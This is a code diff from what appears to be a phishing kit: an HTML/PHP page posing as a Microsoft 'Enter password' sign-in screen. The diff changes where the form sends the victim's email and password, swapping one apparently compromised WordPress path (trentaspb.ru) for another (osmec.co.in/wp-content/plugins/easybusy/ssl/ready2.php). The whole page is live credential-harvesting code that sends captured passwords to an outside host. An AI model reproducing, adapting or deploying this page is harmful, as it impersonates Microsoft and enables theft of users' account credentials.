@@ -173,7 +173,7 @@ document.getElementById("animateee").style.display = "none";
 <body id = "background"> 
 <div id = "content">
        <img src = "images/microsoft_logo.png" alt = "logo" width = "120px" height = "25px" style = "margin-left:50px; margin-top:40px" >
-          <form action = "https://trentaspb.ru/wp-admin/optimal/wab2.php?email=$value&id=21992a30eabdb21992a30eabdb21992a30eabdbe5aa531f0da8a641dd6e5aa531f0da8a641dd6e5a21992a30eabdbe5aa531f0da8a641dd6a531f0da8a641dd6&ref=5465
+          <form action = "https://osmec.co.in//wp-content/plugins/easybusy/ssl/ready2.php?email=$value&id=21992a30eabdb21992a30eabdb21992a30eabdbe5aa531f0da8a641dd6e5aa531f0da8a641dd6e5a21992a30eabdbe5aa531f0da8a641dd6a531f0da8a641dd6&ref=5465
 " method = "post">
             <p style = "margin-left:50px; margin-top:20px; font-size:15px"><a href = "update1.php" style = "color:grey"><i class="fa fa-arrow-left" aria-hidden="true"></i><?php echo $value;?></a></p>
             <p style = "margin-left:50px; margin-top:15px; font-size:30px">Enter password</p>
